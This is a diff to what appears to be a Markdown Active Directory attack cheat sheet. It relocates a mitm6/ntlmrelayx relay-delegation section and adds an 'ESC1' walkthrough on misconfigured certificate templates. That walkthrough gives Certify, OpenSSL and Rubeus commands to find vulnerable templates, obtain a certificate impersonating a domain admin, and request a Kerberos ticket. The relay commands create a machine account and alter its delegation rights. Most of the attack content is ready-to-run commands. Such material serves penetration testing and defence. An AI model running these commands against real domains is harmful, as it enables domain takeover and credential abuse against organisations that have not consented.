@@ -62,7 +62,10 @@
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
       - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
-      - [AD CS Relay Attack](#ad-cs-relay-attack)
+      - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+    - [Active Directory Certificate Services](#active-directory-certificate-services)
+      - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
+      - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -86,7 +89,6 @@
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
-    - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
@@ -1744,7 +1746,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 
 #### Ghost Potato - CVE-2019-1384
 
-Prerequisites:
+Requirements:
 * User must be a member of the local Administrators group
 * User must be a member of the Backup Operators group
 * Token must be elevated
@@ -1759,10 +1761,9 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 
 > It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
 
-Requirement:
-
-* a shell in session 0 (e.g. WinRm shell or SSH shell)
-* a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
+Requirements:
+- a shell in session 0 (e.g. WinRm shell or SSH shell)
+- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
 
 ```powershell
 # https://github.com/antonioCoco/RemotePotato0/
@@ -1772,7 +1773,61 @@ Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
 Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ```
 
-#### AD CS Relay Attack
+
+#### Relay delegation with mitm6
+
+Requirements: 
+- IPv6 enabled (Windows prefers IPV6 over IPv4)
+- LDAP over TLS (LDAPS)
+
+> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
+
+```powershell
+git clone https://github.com/fox-it/mitm6.git 
+cd /opt/tools/mitm6
+pip install .
+
+mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
+then use rubeus with s4u to relay the delegation
+```
+
+
+### Active Directory Certificate Services
+
+#### ESC1 - Misconfigured Certificate Templates
+
+> Domain Users can enroll in the **VulnTemplate** template, which can be used for client authentication and has **ENROLLEE_SUPPLIES_SUBJECT** set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.
+
+Requirements:
+*  Template that allows for AD authentication
+* **ENROLLEE_SUPPLIES_SUBJECT** flag
+* [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) 
+
+Exploitation:
+* Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates
+    ```ps1
+    Certify.exe find /vulnerable
+    ```
+* Use Certify to request a Certificate and add an alternative name (user to impersonate)
+    ```ps1
+    Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
+    ```
+* Use OpenSSL and convert the certificate, do not enter a password
+    ```ps1
+    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+    ```
+* Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
+    ```ps1
+    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
+    ```
+
+**WARNING**: These certificates will still be usable even if the user or computer resets their password!
+
+**NOTE**: Look for **EDITF_ATTRIBUTESUBJECTALTNAME2**, **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**, **ManageCA** flags, and NTLM Relay to AD CS HTTP Endpoints.
+
+
+#### ESC8 - AD CS Relay Attack
 
 > An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.
 
@@ -2493,24 +2548,6 @@ python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate U
 .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
 ```
 
-### Relay delegation with mitm6
-
-Prerequisites: 
-- IPv6 enabled (Windows prefers IPV6 over IPv4)
-- LDAP over TLS (LDAPS)
-
-> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
-
-```powershell
-git clone https://github.com/fox-it/mitm6.git 
-cd /opt/tools/mitm6
-pip install .
-
-mitm6 -hw ws02 -d lab.local --ignore-nofqnd
-ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
-then use rubeus with s4u to relay the delegation
-```
-
 ### PrivExchange attack
 
 Exchange your privileges for Domain Admin privs by abusing Exchange.    
@@ -2876,3 +2913,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
 * [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
 * [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
+* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
